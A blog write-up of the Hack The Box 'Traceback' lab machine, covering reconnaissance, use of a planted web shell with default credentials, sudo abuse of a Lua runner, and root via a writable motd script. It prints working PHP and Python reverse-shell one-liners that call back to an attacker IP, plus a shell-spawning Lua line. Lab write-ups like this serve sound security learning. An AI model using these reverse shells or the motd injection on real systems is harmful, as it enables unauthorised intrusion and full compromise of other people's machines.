---
title: Traceback
date: 2020-06-24
hero: /images/content/posts/hack-the-box/traceback.png
categories:
- hack-the-box
tags:
- windows
- reverse-shell
- lua
---

This machine was challenging, but I learned a lot. I learned how to make "smarter" shells and how to upload the `pspy` script to a remote server. I wonder if I could have completed this machine without adding my public ssh key, because at the moment it is very identifiable. It was a good box tho. I look forward to my next one.

## Tools

* nmap
* smevk.php
* lua
* ssh

## Recon

First things first, let's run our `nmap` scan. I used the command `sudo nmap -sS -sV -p- traceback.htb`.

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-24 00:33 EDT
Nmap scan report for traceback.htb (10.10.10.181)
Host is up (0.12s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 860.02 seconds
```

As usual with a htb machine there is a website being hosted, and it looks like the machine is pwned already. If we view the page source we can see the comment `<!--Some of the best web shells that you might need ;)-->`, so there might be a web shell some where. I am going to do a `ffuf` scan on the domain. The command I used is `ffuf -u http://traceback.htb/FUZZ -w /usr/share/dirb/wordlists/big.txt -e .html,.txt,.php,.xml`. 

That did not teach us anything new, but after googling some stuff about the author... considering that he signed the first page of the web site I found a repository that he forked called `Web-Shells`. So I created a wordlist with the files in that repo and after running the command `ffuf -u http://traceback.htb/FUZZ -w web_shell_wordlist.txt`, `ffuf` found the shell `smevk.php`, unfortunately it is locked behind a login screen.

## User

If we take a look at the source code for this shell in the [GitHub repo](https://github.com/Xh4H/Web-Shells/blob/master/smevk.php) we can see that the default credentials are `admin::admin`. If we try them they work! Awesome so we got into the web shell.

Once we are in there is a field where we can execute a command. So let's create a reverse shell. First on our attacking machine use the command `nc -lvnp 1234`, then I used a `php` reverse shell because I know the server can run `php`. Here is the code I ran on the web shell `php -r '$sock=fsockopen("10.10.14.100",1234);exec("/bin/sh -i <&3 >&3 2>&3");'`. Change the IP address to what is on the IPv4 section on the access page on the HTB web site.

In our shell we are the user `webadmin`, let's navigate to this user's home directory by using the command `cd /home/webadmin`. In here we see a note file that reads:

```
- sysadmin -
I have left a tool to practice Lua.
I'm sure you know where to find it.
Contact me if you have any question.
```

I found it by using `sudo -l`. It seems there is a file called `/home/sysadmin/luvit` that we should be able to run. After a quick google search it turns out that `luvit` can be used to run `lua` scripts.

```
User webadmin may run the following commands on traceback:
    (sysadmin) NOPASSWD: /home/sysadmin/luvit
```

We can get some code to spawn another shell from [here](https://gtfobins.github.io/gtfobins/lua/). We can create the script by `echo`ing the content of the script into a file in the `/tmp` directory then running the script with `sudo -u sysadmin /home/sysadmin/luvit script.lua`. Because when we did `sudo -l` we found out that we can run `luvit` as `sysadmin` without a password. Okay so here is what I did step by step:

First I navigated to the `/tmp` directory, then I echoed the following code into a file called `script.lua`.

```
os.execute("/bin/sh")
```

Then I executed the command `sudo -u sysadmin /home/sysadmin/luvit script.lua`. This throws us into another shell if we run `whoami` then we are the `sysadmin` user. But it is not that good looking, so let's try and make a new reverse shell from this user. I just used to command `nc -lvnp 9999` on my attacking machine then used the command `php -r '$sock=fsockopen("10.10.14.100",9999);exec("/bin/sh -i <&3 >&3 2>&3");'` from the ugly shell. There we go a better shell.

## Root

Now let's get root, but first I upgraded the shell again with the command `python3 -c 'import pty; pty.spawn("/bin/bash")'`. Okay so I added my ssh public key to the `authorized_keys` file because I want to be able to reconnect fast if I mess up. This probably isn't advisable. This also allows me to `scp` `pspy` onto the machine to monitor the processes running. I notice that the files in the `/etc/update-motd.d` get replaced by there backups frequently. Let's check them out. It looks like we have permission to edit these files in the `update-motd.d` directory. Let's try and add some code and `ssh` into the `sysadmin` user to escalate privileges. This is a long shot, but here goes nothing.

First I started listening on my machine on port 9999 then I added the following code to the file `00-header`.

```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.100",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Next I had to `ssh` into the machine quickly before my script was over written. Once I `ssh` back into the machine as `sysadmin` this reverse shell was activated on my listening port. When I type `whoami`, I am `root`.
